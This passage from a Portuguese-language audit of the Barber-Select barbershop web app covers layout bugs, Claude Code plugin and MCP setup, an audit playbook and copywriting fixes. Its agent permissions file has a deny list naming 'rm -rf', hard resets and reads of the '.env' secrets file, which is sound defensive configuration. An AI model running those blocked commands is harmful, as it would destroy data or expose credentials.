E `public/staff/dashboard.html:606` — a tabela "Próximos Agendamentos" **não** está dentro de `.table-wrap`, mas `styles.css:2167` aplica `min-width: 620px` a ela no mobile → **overflow horizontal da página inteira**. As outras 7 tabelas **estão** corretamente dentro de wrappers com `overflow-x: auto` ✅.

### 6.10 [D-10] 🟡 `100% Responsivo` e `Banco de Dados MySQL` como *features* de marketing

**Arquivo:** `public/index.html:255-268`

Anunciar o banco de dados e a responsividade como benefícios para o dono da barbearia é um **bug de marketing** — é implementação, não valor. E a claim **"100% Responsivo"** é questionável: o dashboard tem 301 px de overflow no mobile (D-04) e a área do cliente tem 4 botões de horário que submeterem o formulário (ver §8).

---

## 🔧 7. Instalar e configurar as ferramentas de auditoria no Claude Code

Esta auditoria foi feita com skills e MCPs específicos. Para que **o próprio agente refaça essa análise sozinho** — neste repositório e em qualquer PR futuro — instale e configure o que segue. Todos os comandos abaixo foram verificados contra os repositórios de origem (marketplace, nome do plugin e caminho das skills conferidos no GitHub).

### 7.1 Pré-requisitos

```bash
node --version      # >= 20 (o projeto usa Express 5 e node:test)
npm --version
npx playwright install chromium   # o MCP do Playwright precisa de um browser
```

### 7.2 Skills de design, escrita e code review (marketplaces do Claude Code)

Duas formas equivalentes — **CLI** (scriptável, ideal para CI) ou **slash command** (interativa).

```bash
# ---- CLI ----
claude plugin marketplace add Leonxlnx/taste-skill
claude plugin marketplace add nextlevelbuilder/ui-ux-pro-max-skill
claude plugin marketplace add b33kman/professional-business-writing-skill
claude plugin marketplace add anthropics/claude-plugins-official

claude plugin install taste-skill@taste-skill
claude plugin install ui-ux-pro-max@ui-ux-pro-max-skill
claude plugin install professional-business-writing@professional-business-writing-skill
claude plugin install frontend-design@claude-plugins-official
claude plugin install code-review@claude-plugins-official
claude plugin install code-modernization@claude-plugins-official
claude plugin install claude-security@claude-plugins-official
claude plugin install pr-review-toolkit@claude-plugins-official
```

```text
# ---- dentro de uma sessão do Claude Code ----
/plugin marketplace add Leonxlnx/taste-skill
/plugin marketplace add nextlevelbuilder/ui-ux-pro-max-skill
/plugin marketplace add b33kman/professional-business-writing-skill
/plugin marketplace add anthropics/claude-plugins-official

/plugin install taste-skill@taste-skill
/plugin install ui-ux-pro-max@ui-ux-pro-max-skill
/plugin install professional-business-writing@professional-business-writing-skill
/plugin install frontend-design@claude-plugins-official
/plugin install code-review@claude-plugins-official
/plugin install code-modernization@claude-plugins-official
/plugin install claude-security@claude-plugins-official
/plugin install pr-review-toolkit@claude-plugins-official
```

| Marketplace | Plugin | Para que serve nesta auditoria |
|---|---|---|
| `Leonxlnx/taste-skill` | `taste-skill` | Anti-slop: `lint.mjs` + `inspect.mjs` medem a landing em Chromium real (§6.1) |
| `nextlevelbuilder/ui-ux-pro-max-skill` | `ui-ux-pro-max` | Base de 119 regras de UX, 79 estilos, 192 paletas (§6) |
| `b33kman/professional-business-writing-skill` | `professional-business-writing` | 18 padrões de IA + processo de humanização (§8) |
| `anthropics/claude-plugins-official` | `frontend-design` | Direção de arte anti-templatizada (§6) |
| `anthropics/claude-plugins-official` | `code-review`, `code-modernization`, `pr-review-toolkit`, `claude-security` | Revisão de código e modernização (§5) |

> **Nota sobre o marketplace do business-writing:** o `marketplace.json` dele **não tem campo `name`**, então o Claude Code usa o nome do repositório — `professional-business-writing-skill` — como nome do marketplace, e `professional-business-writing` como nome do plugin. É essa a combinação a usar acima.

### 7.3 Alternativa sem marketplace (copiar as skills direto)

Útil se a política da empresa proibir marketplaces de terceiros, ou se você quiser fixar a versão.

```bash
# taste-skill  →  skills/taste-skill/SKILL.md
git clone --depth 1 https://github.com/Leonxlnx/taste-skill.git /tmp/taste-skill
mkdir -p ~/.claude/skills
cp -r /tmp/taste-skill/skills/taste-skill ~/.claude/skills/

# ui-ux-pro-max  →  .claude/skills/ui-ux-pro-max/SKILL.md
git clone --depth 1 https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.git /tmp/ui-ux
cp -r /tmp/ui-ux/.claude/skills/ui-ux-pro-max ~/.claude/skills/

# professional-business-writing  →  SKILL.md na raiz
git clone --depth 1 https://github.com/b33kman/professional-business-writing-skill.git /tmp/pbw
mkdir -p ~/.claude/skills/professional-business-writing
cp /tmp/pbw/SKILL.md ~/.claude/skills/professional-business-writing/

# frontend-design  (do marketplace oficial)
git clone --depth 1 https://github.com/anthropics/claude-plugins-official.git /tmp/cpo
mkdir -p ~/.claude/skills/frontend-design
cp -r /tmp/cpo/plugins/frontend-design/skills/frontend-design/* ~/.claude/skills/frontend-design/
```

### 7.4 MCPs

```bash
# Playwright — o navegador real. Foi ele que revelou que a CSP bloqueia
# 9 <script> inline + 15 onclick, e o overflow de 301 px no mobile.
claude mcp add playwright -- npx -y @playwright/mcp@latest

# context-mode — executa comandos e mantém a saída grande fora da janela
# de contexto (útil para npm audit, logs de servidor e dumps de API).
npm install -g context-mode
context-mode setup --agents claude-code
claude mcp add context-mode -- context-mode server --agent claude-code
```

**Escopo por usuário** (`~/.claude.json`) vs. **escopo do projeto** (`.mcp.json` versionado):

```bash
claude mcp list                 # o que está registrado
claude mcp get playwright        # detalhe de um servidor
claude mcp remove context-mode   # remover
```

### 7.5 `.mcp.json` do projeto — versionar no repositório

Crie `.mcp.json` na raiz do Barber-Select para que qualquer pessoa da equipe (e o CI) suba com as mesmas ferramentas:

```json
{
  "mcpServers": {
    "playwright": {
      "command": "npx",
      "args": ["-y", "@playwright/mcp@latest"]
    },
    "context-mode": {
      "command": "context-mode",
      "args": ["server", "--agent", "claude-code"]
    }
  }
}
```

> ⚠️ `npx -y` baixa o pacote no primeiro uso. Se a rede for restrita, prefira `npm i -g @playwright/mcp` e aponte para o binário absoluto em `args`.

### 7.6 `.claude/settings.json` — permissões do agente

O Claude Code abre o navegador, sobe o servidor, roda `npm audit` e faz `curl` na API. Sem permissões, ele pergunta a cada comando.

```json
{
  "permissions": {
    "allow": [
      "Bash(node server.js:*)",
      "Bash(node --watch server.js:*)",
      "Bash(npm audit:*)",
      "Bash(npm install:*)",
      "Bash(npm test:*)",
      "Bash(npx playwright install:*)",
      "Bash(curl:*)",
      "Bash(git log:*)",
      "Bash(git diff:*)",
      "Bash(git show:*)",
      "Bash(git status:*)",
      "Bash(python3:*)",
      "Bash(node .claude/scripts/*.mjs:*)",
      "mcp__playwright__browser_navigate",
      "mcp__playwright__browser_snapshot",
      "mcp__playwright__browser_take_screenshot",
      "mcp__playwright__browser_evaluate",
      "mcp__playwright__browser_console_messages",
      "mcp__playwright__browser_network_requests",
      "mcp__playwright__browser_click",
      "mcp__playwright__browser_fill_form",
      "mcp__playwright__browser_resize",
      "mcp__context-mode__ctx_batch",
      "mcp__context-mode__ctx_search"
    ],
    "deny": [
      "Bash(rm -rf:*)",
      "Bash(git push:*)",
      "Bash(git reset --hard:*)",
      "Bash(npm publish:*)",
      "Read(./.env)",
      "Read(./.env.*)"
    ]
  },
  "env": {
    "BASH_DEFAULT_TIMEOUT_MS": "180000"
  }
}
```

> **`Read(./.env)` bloqueado de propósito:** a auditoria precisa *existir* que existe um `.env`, mas não deve ler o conteúdo — ele contém `JWT_SECRET` e as senhas de fallback.

### 7.7 `CLAUDE.md` — playbook de auditoria

O repositório **já tem** um `CLAUDE.md` com o contexto do projeto. Acrescente esta seção ao final dele para que o agente saiba **como** auditar:

````markdown
## 6. Como auditar este repositório (playbook)

Quando pedirem "auditoria", "code review", "melhorias de design" ou "LGPD",
siga a ordem abaixo. Não pule etapas: metade dos achados mais graves só
aparecem **em runtime**.

### 6.1 Preparação
```bash
npm install
node server.js &        # porta conforme o .env (default 3000)
curl -s localhost:3000/api/health
```

### 6.2 Segurança (use as skills `claude-security` + `code-review`)
1. **Mapeie rota → middleware → roles.** Liste TODAS as rotas e confirme se
   cada uma restringe o perfil. `authenticate()` **sem argumentos** autoriza
   qualquer usuário autenticado — inclusive `client`. Esse é o vetor mais
   perigoso do projeto (ver AUDITORIA-BARBER-SELECT.md §P0-01).
2. **Teste a matriz de autorização em runtime:** autentique como `client` e
   chame cada rota de staff/admin. `403` = bloqueado ✅ · `500` = **passou
   pela autorização** e quebrou no banco ❌.
3. Verifique CSP, rate limit, lockout, blacklist de token e seeds de credencial.

### 6.3 Frontend (use `code-review` + `code-modernization`)
4. Suba o servidor e **navegue com o MCP do Playwright** em 1440/768/390 px.
   Leia o console: **handler inline bloqueado pela CSP é o bug nº 1 do app.**
5. Procure `innerHTML` com dados de API. Confirme se o `escapeHtml` escapa
   **aspas** (sem isso há *attribute breakout*).
6. Verifique se todo `fetch` passa por `authenticatedFetch` (auto-refresh).

### 6.4 Design (use `ui-ux-pro-max` + `taste-skill` + `frontend-design`)
7. ```bash
   node <taste-skill>/scripts/lint.mjs public/index.html
   node <taste-skill>/scripts/inspect.mjs public/index.html   # requer CHROME_PATH
   ```
   Todo **FAIL** é um achado. Confira também os tokens duplicados em
   `:root`, `prefers-reduced-motion` e foco visível.

### 6.5 Escrita (use `professional-business-writing`)
8. Audite a copy: tells de IA, termos duplicados para o mesmo conceito,
   verbos de botão inconsistentes, acentos e capitalização.

### 6.6 LGPD
9. Confirme: aviso de privacidade, encarregado, base legal por finalidade,
   registro de operações (art. 37), portabilidade com UI, anonimização que
   cubra **todas** as tabelas e ausência de transferência internacional
   via CDN de terceiros.

### 6.7 Entrega
10. Entregue um Markdown em **português do Brasil**, com achados classificados
    por severidade, **arquivo:linha**, trecho de código, impacto e correção
    pronta para colar. Marque explicitamente o que foi **verificado em
    runtime** e o que foi inferido por leitura.
````

### 7.8 Slash command `/auditar` (opcional)

Crie `.claude/commands/auditar.md` na raiz do repositório:

```markdown
---
description: Roda a auditoria completa (segurança, frontend, design, escrita, LGPD) e entrega um Markdown em PT-BR
allowed-tools: Bash(node server.js:*), Bash(npm audit:*), Bash(curl:*), Bash(python3:*), Bash(node .claude/scripts/*), mcp__playwright__*, mcp__context-mode__*, Read, Grep, Glob, Edit, Write
---

Execute a auditoria completa do Barber-Select seguindo o playbook da seção
"Como auditar este repositório" do CLAUDE.md.

Requisitos:
1. Suba o servidor e audite **em runtime**, não só por leitura.
2. Use a matriz de autorização com token de `client` — é o achado mais grave.
3. Navegue com o Playwright em 1440/768/390 px e leia o console do navegador.
4. Rode o `inspect.mjs` do taste-skill na landing e nas telas de staff.
5. Verifique LGPD por artigo.
6. Entregue `AUDITORIA-BARBER-SELECT.md` em PT-BR, com arquivo:linha,
   severidade, impacto e correção pronta para colar.
```

### 7.9 Verificação

```bash
# skills e plugins registrados
claude plugin marketplace list
claude plugin list

# MCPs
claude mcp list

# context-mode
context-mode doctor

# as skills respondem?
claude --print "Liste as skills de design disponíveis" | head -20
```

---

## ✍️ 8. Escrita e Copy (PT-BR)

### 8.1 Os 7 tells de IA mais custosos

| # | Tell | Onde | Correção |
|---|---|---|---|
| 1 | **Headline genérica em 4 linhas** | `index.html:63-65` | "Gestão inteligente para sua barbearia" → **"Sua barbearia no padrão certo."** (31 chars, 1 linha) |
| 2 | **Eyebrow acima de todo título** | `index.html:167, 233, 292` | Remova os 3. A informação já está no título ou não é necessária. |
| 3 | **"Plataforma Líder em Gestão para Barbearias"** | `index.html:62` | Superlativo não verificável (risco de publicidade). → *"Gestão completa para barbearias"*. |
| 4 | **Verbos infinitivos genéricos** | landing inteiro | "Agende, gerencie, controle" → verbos concretos: "Reserve um horário", "Veja o caixa de hoje", "Baixe o estoque". |
| 5 | **"Começar Gratuitamente" / "Criar Conta Gratuita"** | `index.html:84, 303` | Duas CTA para a mesma ação, prometendo algo que o produto não define. Unifique em **"Criar conta"**. |
| 6 | **"Self-service" / "refresh tokens"** | `index.html:179, 246` | Jargão em inglês em página PT-BR → *"Área do cliente"* / *"tokens de renovação"*. |
| 7 | **"Zero Fila, Zero Conflito"** | `index.html:275` | → *"Sem filas, sem conflitos"*. |

### 8.2 "Staff" ao lado de "Colaborador" — a contradição mais visível

**5 telas têm os dois rótulos empilhados:**

```html
<!-- staff/dashboard.html:461 -->
<b>Colaborador</b>
<span>Staff</span>

<!-- staff/clients.html:270 · staff/produtos.html:348 · staff/venda.html:354 -->
<b>Colaborador</b>
<span>Staff</span>

<!-- staff/agenda.html:545 -->
<b>Colaborador</b>
<span>Staff / Admin</span>
```

O usuário vê "Colaborador" e "Staff" **juntos**, sem contexto. Isso é obrigatório e Modelos de Dados — e o resto do app usa "Colaborador".

**Correção:** substitua todos os `<span>Staff</span>` por `<span>Colaborador</span>` e `<span>Staff / Admin</span>` por `<span>Colaborador / Administrador</span>`.

### 8.3 Quadro de consistência terminológica — 13 nomes para 5 conceitos

| Conceito | Termo canônico | Variantes encontradas (arquivo:linha) |
|---|---|---|
| **Quem atende** | **Profissional** | "Barbeiro" (`staff/barbeiros.html`, `clients-routes.js` `fav_barber`), "Colaborador" (landing, `staff/dashboard.html:460`), "Equipe" (landing), "Staff" (`staff/dashboard.html:461`), "Profissional" (landing) |
| **O time da barbearia** | **Equipe** | "Equipe" (landing), "Staff" (`staff/dashboard.html:461`), "Equipe de barbeiros" (`staff/barbeiros.html:47`) |
| **Sistema de horários (tela)** | **Agenda** | "Agenda Inteligente" (`staff/agenda.html:535`), "Gerenciamento em tempo real…" (`staff/agenda.html:536`) |
| **Um horário marcado** | **Agendamento** | "Atendimentos" (`staff/agenda.html:628`), "Horário" (landing), "Marcação" (não usado ✅) |
| **Quem é atendido** | **Cliente** | "Usuário" (`index.html:169`, `client/home.html:463`), "Paciente" (não usado ✅) |
| **Dinheiro — a área** | **Financeiro** | "Fluxo de caixa" (landing), "Transações" (`staff/finance.html`) |
| **Dinheiro — a tela** | **Caixa** | "Caixa" (`staff/finance.html:386` "Saldo em Caixa"), "Financeiro" (landing) |
| **Uma movimentação** | **Movimentação** | "Transação" (`staff/finance.html:397`), "Venda" (`staff/venda.html`) |
| **Sair do sistema** | **Sair** | "Logout" (`styles-logout.css`), "Sair da conta" (`client/*.html`), "Encerrar sessão" (`shared.js:150`) |
| **Entrar** | **Entrar** | "Acessar Sistema" (landing), "Fazer login" (`pages/cadastro.html:207`), "Entrar no Sistema" (`pages/login.html:151`) |
| **Configurações** | **Configurações** | "Ajustes" (`client/home.html:568`, `client/profile.html:547`, `client/request.html:418`, `client/settings.html:495`) |
| **Catálogo** | **Serviços** | "Catálogo" (`staff/services.html:146`), "Corte + Barba" vs "Combo" (`client/home.html:539` vs `staff/services.html:157`) |

O pior caso está em `staff/agenda.html`:

```html
<!-- :599 -->
<label for="filter-staff">Barbeiro / Colaborador</label>   <!-- 🔎 grafia correta no código; o achado "Collaborador" foi retirado -->
<!-- :700 — 100 linhas depois, o MESMO modal -->
<label for="...">Profissional *</label>
```

**Três nomes para a mesma pessoa, no mesmo formulário — um deles com C duplo.**

> **Por que "Profissional" e não "Colaborador"?** O cargo real é o barbeiro — mas "barbeiro" exclui quem faz só barba ou tratamento. "Colaborador" é termo de RH, e o dono da barbearia não pensa em "colaborador", pensa em "quem corta o cabelo dele". **Profissional** é o termo que o próprio produto já usa (`staff/agenda.html:652`, `client/request.html:368`) e cobre todos os cargos da equipe. "Colaborador" pode sobreviver **apenas** como rótulo do perfil de acesso (`staff`), nunca como cargo.

**Estrutura de menu recomendada (uma entrada por conceito, sem sinônimos):**

```
Painel · Agenda · Clientes · Equipe · Serviços · Produtos · Vendas · Financeiro · Relatórios · Avaliações · Configurações
```

### 8.4 11 verbos para a mesma ação

| Verbo | Onde |
|---|---|
| `Cadastrar` | "Cadastrar Produto" (`produtos.html:446`), "Cadastrar cliente" (`novocliente.html:199`), "Cadastrar barbeiro" (`barbeiros.html:135`), "Cadastrar serviço" (`services.html:137`) |
| `Registrar` | "Registrar Venda" (`venda.html:464`), "Registrar Transação" (`finance.html:447`), "Registrar caixa" (`dashboard.html:666`) |
| `Salvar` | "Salvar Agendamento" (`agenda.html:726`), "Salvar Alterações" (`configuracoes.html:250`), "Salvar Todas as Alterações" (`profile.html:523`) |
| `Confirmar` | "Confirmar agendamento" (`novagendamento.html:238`), "Confirmar e Enviar para Agenda" (`request.html:395`) |
| `Criar` | "Criar Conta" (`index.html:47`), "Criar conta" (`cadastro.html:198`) |

**Regra proposta:**

| Contexto | Verbo | Exemplos |
|---|---|---|
| Criar registro novo | **Cadastrar** | "Cadastrar Produto", "Cadastrar Agendamento", "Cadastrar Cliente" |
| Editar registro existente | **Salvar** | "Salvar alterações" |
| Registrar evento financeiro | **Registrar** | "Registrar Venda", "Registrar Transação" |
| Confirmar reserva | **Confirmar** | "Confirmar Agendamento" |

E normalize a capitalização: **"Cadastrar Produto"** em toda parte, nunca "Cadastrar cliente".

### 8.5 Erros de português (verificados)

| Arquivo:linha | Como está | Correto |
|---|---|---|
| `staff/novagendamento.html:188` | `Horarios disponiveis` | **`Horários disponíveis`** |
| `staff/novagendamento.html:221` | `Data e horario` | **`Data e horário`** |
| `staff/novagendamento.html:213` | `Bruno ferreira` | **`Bruno Ferreira`** |
| `staff/novagendamento.html:217` | `Corte social` | **`Corte Social`** |
| `staff/novagendamento.html:120` | `preencha as informações abaixo` | **`Preencha`** |
| `staff/novagendamento.html:167` | `<option value="">Degrade</option>` | **`Degradê`** (o app usa "Degradê" em `client/home.html:528`) |
| `staff/configuracoes.html:257` | `GERENCIAMENTO DE UNIDADES (SAAS)` | **`(SaaS)`** + sentence case |
| `staff/dashboard.html:475` / `relatorios.html:146,211,247` / `avaliacoes.html:148,193` | Títulos em **CAIXA ALTA** | Sentence case (única exceção: a wordmark) |
| `staff/services.html:120` | Label `"Duração"` sem unidade | **`"Duração * (min)"`** — toda outra unidade do app está no label (`"Valor * (R$)"`, `"Preço de Venda * (R$)"`) |
| `client/profile.html:457` | `"nos depoimentos da barbearia"` | **"nas avaliações da barbearia"** (o app chama de "avaliações" em toda parte) |

### 8.6 Nome da marca escrito de 4 formas

| Forma | Onde |
|---|---|
| `Barber-Select` | `login.html:6,43`, `index.html:10,12,38,39,295,315,353`, `client/*.html:6`, `staff/clients.html:6,262`, `staff/finance.html:6`, `staff/produtos.html:6`, `staff/venda.html:6`, `staff/agenda.html:6`, `staff/dashboard.html:6` |
| `Barber Select` (espaço) | `staff/avaliacoes.html:6,16`, `barbeiros.html:7,17`, `configuracoes.html:6,18,116`, `relatorios.html:6,16`, `services.html:7,17`, `novocliente.html:6,21`, `novagendamento.html:6,21` |
| `BARBER-SELECT` | `pages/auth.html:20` |
| `barber-select-dashboard.app` | `index.html:108` (mock de janela macOS) |

**14 títulos de página** com 2 grafias. Canonicalize em **`Barber-Select`** e unifique o separador (`|` vs `-`: 7 páginas cada).

### 8.7 Botões e ações que prometem o que não existe

| Onde | Promete | Realidade |
|---|---|---|
| `staff/relatorios.html:211-243` | "Relatório de Vendas — **Exportar em PDF**", "Planilha Financeira — **Exportar em Excel**" | São `<div style="cursor:pointer">` **sem handler nenhum**. Click não faz nada. |
| `public/pages/login.html:160-162` | Botões "Google" e "Microsoft" | `disabled` sem explicação. ✅ o `pages/login.html` marca "Em breve" — mas o **login.html** (não `auth.html`) não. |
| `staff/configuracoes.html:116,135,168,177` | Dados da barbearia, CNPJ `12.345.678/0001-90`, telefone `(11) 99999-8888` | Hardcoded, sem aviso de "exemplo". |
| `client/profile.html:470` | Botão "excluir dados" | Só faz `alert('Entre em contato com o suporte...')` — e o `onclick` está **bloqueado pela CSP** (§P0-02), então não faz nem isso. |
| `staff/services.html:196` | `"Serviços inativos não deverão aparecer para novos agendamentos; registros já utilizados poderão continuar associados ao histórico."` | 22 palavras de texto legal na UI. |

**Correção:** remova o que não funciona ou rotule honestamente (`"Em breve"`, `"Dados de exemplo"`). Um `cursor:pointer` sem ação é uma **promessa quebrada** ao usuário.

### 8.8 "Cadastre sua barbearia" entrega "cadastre-se como cliente"

```html
<!-- public/pages/login.html:173-175 -->
<p>Ainda não tem uma conta?
  <a href="cadastro.html">Cadastre sua barbearia</a>
</p>
```

Mas `public/pages/cadastro.html:97` diz: *"Cadastre-se como cliente para agendar seus serviços."* Duas promessas, uma página.

**Correção:** → *"Ainda não tem uma conta?* ***Cadastre-se como cliente"***

### 8.9 A checkbox que mente

`public/pages/login.html:142`:

```html
<input type="checkbox" id="remember-me" />
```

**Uma única ocorrência de `remember` em todo o repositório** — nenhum JS lê essa checkbox. Ela promete "Lembrar de mim" e não faz nada.

**Duas saídas:**

1. **Implementar:**
```js
// public/js/auth/auth-manager.js
const remember = document.getElementById("remember-me")?.checked;
const store = remember ? localStorage : sessionStorage;
store.setItem("refreshToken", data.refreshToken);
```
2. **Remover** a checkbox e o rótulo.

### 8.10 Microcopy: tabela de substituições

| Onde | Texto atual | Texto proposto |
|---|---|---|
| `staff-app.js:678` | "Produto cadastrado com sucesso! (Funcionalidade em desenvolvimento)" | *(remover o botão até a API existir)* |
| `staff-app.js:706` | "Ver detalhes do cliente {id} (em desenvolvimento)" | "Abrir ficha do cliente" (implementar) |
| `server.js:102` | "Dados de login inválidos." | "Preencha e-mail (ou usuário) e senha." |
| `server.js:277` | "Usuário ou senha incorretos." | "E-mail ou senha incorretos." (o login aceita e-mail **ou** usuário) |
| `server.js:249` | "Conta temporariamente bloqueada por excesso de tentativas incorretas. Tente novamente em 15 minutos." | "Muitas tentativas. Tente de novo em 15 minutos." |
| `server.js:491` | "Refresh token expirado. Faça login novamente." | "Sua sessão expirou. Entre de novo." |
| `clients-routes.js:253` | "Identificador inválido." | "Este registro não existe." |
| `finance-routes.js:65` | "Erro interno ao listar transações financeiras." | "Não foi possível carregar o financeiro." (e 503 quando o banco cai) |
| `dashboard.html` | "ATENDIMENTOS HOJE" | "Atendimentos hoje" |

### 8.11 Headlines sugeridas (≤ 32 caracteres)

O H1 atual (`"Gestão inteligente para sua barbearia"`) **não diz o que o produto faz**. Um dono de barbearia não quer "gestão inteligente" — ele quer saber quanto entrou hoje, se o barbeiro está livre às 15h e se tem pó para repor. Pior: **o mesmo H1 literal aparece 3×** (`public/index.html:65`, `public/pages/login.html:50`, `public/pages/cadastro.html:43`) e é repetido ainda no `<title>` e na meta description.

**Sub-headline recomendada** (acompanha qualquer uma das 5):
> "Troque a planilha por um sistema que controla a agenda, o caixa e o estoque."

**Meta e title recomendados:**
```html
<title>Barber-Select | Sistema de gestão para barbearias</title>
<meta name="description" content="Sistema de gestão para barbearias: agenda de horários, cadastro de clientes, controle de caixa e estoque de produtos." />
```

| # | Headline | Chars | CTA | Por que funciona |
|---|---|:---:|---|---|
| 1 | **"Sua barbearia sem planilhas"** | 27 | Criar conta | Ataca o concorrente real (a planilha e o caderno, `index.html:69`) com promessa verificável. |
| 2 | **"Agenda, caixa e estoque juntos"** | 30 | Criar conta | Nomeia os três módulos que o dono usa e promete o que é concreto: um lugar só. |
| 3 | **"Da agenda ao caixa, num só lugar"** | 32 | Criar conta | Mostra a jornada real do dia (agendar → cobrar). |
| 4 | **"Menos planilha, mais barbearia"** | 30 | Criar conta | Simetria curta que muda a régua de "software bonito" para "tempo de salão". |
| 5 | **"Controle real da sua barbearia"** | 30 | Ver a agenda | "Real" ataca a desconfiança de quem já usou sistema de gestão que não funciona. |

**H1 das telas de autenticação** — deixar de repetir a landing:
- `public/pages/login.html:50` → **"Sua barbearia organizada"**
- `public/pages/cadastro.html:43` → **"Agende seu próximo horário"**

### 8.12 🔴 O `auth.html` publica um texto de infraestrutura na tela de login

**Arquivo:** `public/pages/auth.html:27-30`

```html
"As credenciais reais ficam em variáveis de ambiente do servidor, não no código da página."
```

Texto **de desenvolvedor**, em linguagem de infra, **numa tela de login**. Parece uma página de debug esquecida no deploy — e está linkada no repositório.

**Correção:** remover. E revisar a página inteira: `public/pages/auth.html` é uma **terceira** tela de login (além de `login.html` e `cadastro.html`), duplicando o `auth-manager.js` com o fluxo por perfil (`PROFILE_MAP`). **Decida qual tela é a oficial e apague as outras** — ver §5 (F-41).

### 8.13 🔴 Erro de português repetido 5 vezes: "tem certeza **que** deseja"

> **🔎 Correção da revisão:** as 5 ocorrências existem. Trata-se de preferência normativa ("tem certeza **de que**"); a forma sem "de" é muito usada e compreendida. Rebaixar para 🟡 (estilo), não erro grave.

**Arquivos:**
- `public/js/core/shared.js:152` — *"Tem certeza que deseja encerrar sua sessão?"*
- `public/staff/agenda.html:873` — *"Tem certeza que deseja excluir este agendamento?"*
- `public/staff/produtos.html:571` — *"Tem certeza que deseja excluir este produto?"*
- `public/staff/venda.html:590` — *"Tem certeza que deseja excluir esta venda?"*
- `public/staff/finance.html:595` — *"Tem certeza que deseja excluir esta transação?"*

Falta o "**de**". E nenhuma delas diz **o que** está sendo excluído.

**Correção — nomeie o objeto e avise que é definitivo:**
```
"Excluir {produto}? Essa ação não pode ser desfeita."
"Excluir o agendamento de {cliente} em {data} às {hora}? Essa ação não pode ser desfeita."
"Excluir a movimentação de {descrição}? Essa ação não pode ser desfeita."
"Excluir a venda de {cliente} no valor de {valor}? Essa ação não pode ser desfeita."
```

### 8.14 ✅ Achado retirado — "Collaborador"

> **🔎 Correção da revisão:** `public/staff/agenda.html:599` contém `Barbeiro / Colaborador` (grafia correta). Nenhum arquivo do projeto usa "Collaborador". A inconsistência de nomes ("Profissional", "Barbeiro", "Colaborador") descrita em 8.3 continua válida.

### 8.15 🔴 "Configurações" e "Ajustes" no **mesmo menu**

| Tela | Menu desktop | Menu mobile |
|---|---|---|
| `public/client/home.html` | "Configurações" (`:445`) | **"Ajustes"** (`:568`) |
| `public/client/profile.html` | "Configurações" (`:391`) | **"Ajustes"** (`:547`) |
| `public/client/request.html` | "Configurações" (`:331`) | **"Ajustes"** (`:418`) |
| `public/client/settings.html` | "Configurações" (`:361`) | **"Ajustes"** (`:495`) |

São **16 telas** com "Configurações" e **4** com "Ajustes" — e nas 4 áreas do cliente, o **mesmo item** aparece com dois nomes no desktop e no mobile. Canonicalize em **"Configurações"**.

### 8.16 🟠 Foreignismos e anglicismos visíveis

| Local | Texto | Correção |
|---|---|---|
| `public/staff/dashboard.html:461` | "Staff" | "Colaborador" |
| `public/staff/agenda.html:545` | "Staff / Admin" | "Colaborador ou administrador" |
| `public/staff/finance.html:346` | "Admin / Owner" | "Administrador" |
| `public/client/settings.html:433` | "Escuro (Dark Mode)" | "Escuro" |
| `public/staff/produtos.html:437` | "Shampoos" | "Shampoo" |
| `public/staff/configuracoes.html:257` | "GERENCIAMENTO DE UNIDADES (SAAS)" | "Unidades da barbearia" |
| `public/pages/cadastro.html:207` | "Fazer login" | "Entrar" |
| `public/js/auth/auth-manager.js:196, 241` | "Login realizado com sucesso!" / "Login realizado." | "Tudo certo. Entrando..." / "Entrando..." |
| `public/index.html:179` | "Self-service ágil" | "O cliente marca o horário e escolhe o profissional sem falar com você." |
| `public/index.html:246` | "Autenticação JWT com tokens de acesso e refresh tokens" | "Cada sessão tem token com validade curta e renovação automática." |
| `public/index.html:344` | Link **"Status da API"** no footer público | Remover — é um link de debug exposto |

**✅ O que está limpo:** nenhuma ocorrência de "senha/palavra-passe", "usuário/utilizador", "arquivo/ficheiro", "tela/ecrã", "Delete/Save/Submit/Search/Settings" em texto visível, "a × há", "mais × mas", "mau × mal", "acerca de", "a nível de", "em meio a". **Não introduza esses anglicismos.**

### 8.17 🟠 O texto promete roadmap e arquitetura

| Local | Texto | Problema | Correção |
|---|---|---|---|
| `public/staff/barbeiros.html:67` | *"Na próxima etapa, os dados deste formulário serão enviados ao servidor e salvos com segurança."* | 🔴 **Falso** — o envio já acontece (`staff-app.js:570-591`) | "Cada profissional entra com o e-mail e a senha que você definir." |
| `public/staff/services.html:131` | *"A duração será usada **futuramente** para reservar o tempo correto…"* | Roadmap dentro do formulário | "A duração define quanto tempo esse serviço ocupa na agenda." |
| `public/staff/agenda.html:536` | *"Gerenciamento em tempo real **conectado ao banco de dados**"* | Vaza arquitetura; 4 buzzwords | "Todos os horários do dia, atualizados na hora." |
| `public/staff/agenda.html:629` | *"Exibindo agendamentos **sincronizados**"* | "Sincronizados" com o quê? | "Mostrando {n} agendamentos" |
| `public/staff/produtos.html:340` | *"Controle completo **integrado ao banco de dados**"* | Vaza arquitetura | "Cadastre produtos, defina preço e acompanhe o saldo." |
| `public/staff/venda.html:346` | *"Registro de vendas **integrado ao fluxo financeiro e estoque**"* | Jargão + arquitetura | "Registre a venda e a forma de pagamento." |
| `public/client/profile.html:621` | *"…atualizados e salvos **no banco de dados** com sucesso!"* | Vaza detalhe técnico ao cliente final | "Perfil atualizado." |
| `public/staff/venda.html:453` | *"Pago (**Lança no Financeiro**)"* | 🔴 Promete um efeito que **não existe** (`staff-app.js:684` é stub) | "Pago" |
| `public/index.html:265` | Card de feature **"Banco de Dados MySQL"** | Nome de tecnologia como benefício | "Dados guardados" |
| `public/js/staff/staff-app.js:431` | *"Cadastre o primeiro serviço usando o formulário **ao lado**."* | 🔴 Erro espacial — o formulário está **acima** (`services.html:75-137`) | "…no formulário **acima**." |

### 8.18 🟠 O `dashboard.html` chama a si mesmo de dois nomes

```html
<!-- staff/dashboard.html:389  (menu lateral) -->
Dashboard
<!-- staff/dashboard.html:447  (H1 da página) -->
Dashboard Executivo
```

E o `<title>` (`staff/dashboard.html:6`) diz "Dashboard | Barber-Select".

**Correção:** H1 → **"Hoje na barbearia"** (diz o que o dono quer ver, não o nome do artefato). Menu e `<title>` podem manter "Painel" ou "Dashboard" — mas **um** termo.

### 8.19 🟡 Glossário de jargão → português simples

| Termo | Onde aparece | É jargão? | Como escrever |
|---|---|:---:|---|
| **PDV** (Ponto de Venda) | `staff/venda.html:345`, `CREDENCIAIS-DEBUG.md:15` | ✅ Sim — sigla de ERP | **"Vendas"** (título da tela e do menu). Nunca exiba "PDV". |
| **Self-service** | `index.html:179`, `CLAUDE.md:8` | ✅ Sim — conotação de vending | **"Agendamento pelo cliente"** |
